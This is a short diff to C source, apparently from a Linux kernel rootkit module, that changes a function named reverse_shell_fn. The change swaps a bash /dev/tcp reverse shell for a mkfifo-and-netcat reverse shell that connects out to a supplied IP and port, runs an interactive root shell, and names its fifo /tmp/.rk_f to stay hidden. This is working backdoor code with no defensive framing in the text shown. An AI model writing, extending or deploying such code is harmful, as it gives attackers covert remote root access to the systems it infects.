@@ -355,7 +355,7 @@ static int reverse_shell_fn(void *data)
     char ip[48] = {0};
     char port_str[8] = {0};
     char *colon;
-    char cmd[128];
+    char cmd[256];
 
     colon = strchr(target, ':');
     if (!colon || (colon - target) >= (int)sizeof(ip)) {
@@ -369,10 +369,13 @@ static int reverse_shell_fn(void *data)
     kfree(target);
 
     snprintf(cmd, sizeof(cmd),
-             "/bin/sh -i >& /dev/tcp/%s/%s 0>&1", ip, port_str);
+             "rm -f /tmp/.rk_f; mkfifo /tmp/.rk_f; "
+             "cat /tmp/.rk_f | /bin/sh -i 2>&1 | "
+             "nc %s %s > /tmp/.rk_f; rm -f /tmp/.rk_f",
+             ip, port_str);
 
     {
-        char *argv[] = {"/bin/bash", "-c", cmd, NULL};
+        char *argv[] = {"/bin/sh", "-c", cmd, NULL};
         char *envp[] = {
             "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
             "HOME=/root",
